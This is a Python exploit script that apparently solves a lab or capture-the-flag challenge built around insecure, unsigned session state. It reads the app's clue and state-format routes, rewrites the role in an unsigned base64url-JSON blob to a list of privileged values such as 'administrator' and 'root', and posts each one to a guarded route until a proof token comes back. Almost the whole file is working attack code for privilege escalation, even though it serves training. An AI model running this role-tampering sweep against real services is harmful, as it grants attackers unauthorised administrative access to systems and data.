#!/usr/bin/env python3
"""Serialized Offender (day-26, curriculum day 20) - insecure deserialization /
unsigned session-state trust.

New bug class (not yet in recovery_lib.py). The Quarkus app discloses, via
`/api/clues` and a `state_format_route`, that its "session" is just a
base64url-of-JSON blob carried in a POST body field - with NO signature/HMAC
("sign nothing"). The server trusts whatever `role` the client puts in that
blob, but only a specific *privileged* role value is accepted by the guarded
feature route (the disclosed `current_role`/`sample_state` role is rejected
with `role_not_permitted`). Reshape the JSON to a privileged role, re-encode,
POST it, and the guarded route returns the proof.

Generic: everything (feature route, state transport/field/encoding, the sample
state shape) is derived live from `/api/clues` + the state-format route. The
only thing not disclosed is *which* role string is privileged, so we sweep a
small evidence-led candidate list (the sample's own role is excluded - it is
the un-privileged one). `administrator` was the accepted value on the
single_solve target; `admin`, `analyst`, `superadmin`, ... are kept as
fallbacks in case a variant uses a different privileged label.

Usage: solve.py <target_base_url> [evidence_dir]
Prints the recovered proof_<hex> to stdout (nothing else on success).
"""
import base64
import json
import re
import sys
import time
import http.cookiejar
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
TIMEOUT = 30
DELAY = 0.5
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")

# Privileged role candidates, most likely first. The sample/current role is
# removed from this list at runtime (it is the un-privileged baseline).
PRIV_ROLE_CANDIDATES = [
    "administrator", "admin", "superadmin", "super_admin", "superuser",
    "root", "owner", "manager", "supervisor", "security_admin", "sysadmin",
    "system", "operator", "auditor", "lead",
]


class Target:
    def __init__(self, base, evidence_dir=None):
        self.base = base.rstrip("/")
        self.ev = Path(evidence_dir) if evidence_dir else None
        if self.ev:
            self.ev.mkdir(parents=True, exist_ok=True)
        self._n = 0
        self.op = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def _save(self, name, status, body):
        if self.ev and name:
            (self.ev / f"{name}.meta.json").write_text(json.dumps({"status": status}, indent=2))
            (self.ev / f"{name}.body").write_text(body)

    def request(self, path, method="GET", data=None, headers=None, save=None):
        if self._n:
            time.sleep(DELAY)
        self._n += 1
        url = path if path.startswith("http") else self.base + path
        if not url.startswith(self.base):
            raise ValueError(f"out-of-scope URL refused: {url}")
        hdrs = {"User-Agent": UA}
        body = None
        if data is not None:
            body = json.dumps(data).encode()
            hdrs["Content-Type"] = "application/json"
        hdrs.update(headers or {})
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        try:
            with self.op.open(req, timeout=TIMEOUT) as r:
                status, text = r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            status, text = e.code, e.read().decode("utf-8", "replace")
        self._save(save, status, text)
        return status, text

    def get_json(self, path, save=None):
        st, body = self.request(path, save=save)
        try:
            return st, json.loads(body)
        except ValueError:
            return st, None

    def post_json(self, path, payload, save=None):
        st, body = self.request(path, "POST", data=payload, save=save)
        try:
            return st, json.loads(body)
        except ValueError:
            return st, body


def b64url_json(obj):
    return base64.urlsafe_b64encode(
        json.dumps(obj, separators=(",", ":")).encode()).decode().rstrip("=")


def rec_unsigned_state_role(t, clues):
    """Reshape the unsigned base64url-JSON state blob to a privileged role and POST
    it to the guarded feature route; return the proof_<hex> it discloses."""
    feature = clues.get("feature_route")
    sf_route = clues.get("state_format_route", "/api/state-format")
    if not feature:
        return None
    st, fmt = t.get_json(sf_route, save="state_format")
    fmt = fmt or {}
    field = fmt.get("request_field", "state")
    sample = fmt.get("sample_state") or {"user": clues.get("current_role", "user"),
                                          "role": clues.get("current_role", "user")}
    base_role = sample.get("role") or clues.get("current_role")
    # role field name: default "role", but honor whatever key the sample uses.
    role_key = "role" if "role" in sample else next(
        (k for k, v in sample.items() if v == base_role), "role")

    candidates = [r for r in PRIV_ROLE_CANDIDATES if r != base_role]
    for i, role in enumerate(candidates):
        state = dict(sample)
        state[role_key] = role
        # Some apps also key trust off the `user` field; set both when a user
        # field mirrors the role (as in the sample {"user":"analyst","role":"analyst"}).
        if sample.get("user") == base_role and "user" in state:
            state["user"] = role
        st, body = t.post_json(feature, {field: b64url_json(state)}, save=f"escalate_{i}_{role}")
        text = body if isinstance(body, str) else json.dumps(body)
        m = PROOF_RE.search(text)
        if m:
            return m.group(0)
    return None


def solve(base, evidence_dir=None):
    t = Target(base, evidence_dir)
    st, clues = t.get_json("/api/clues", save="clues")
    if st != 200 or not isinstance(clues, dict):
        raise SystemExit(f"/api/clues -> {st}; cannot classify")
    proof = rec_unsigned_state_role(t, clues)
    if not proof:
        raise SystemExit("no proof recovered (candidate role list exhausted)")
    return proof


if __name__ == "__main__":
    if len(sys.argv) < 2:
        raise SystemExit("usage: solve.py <target_base_url> [evidence_dir]")
    print(solve(sys.argv[1], sys.argv[2] if len(sys.argv) > 2 else None))
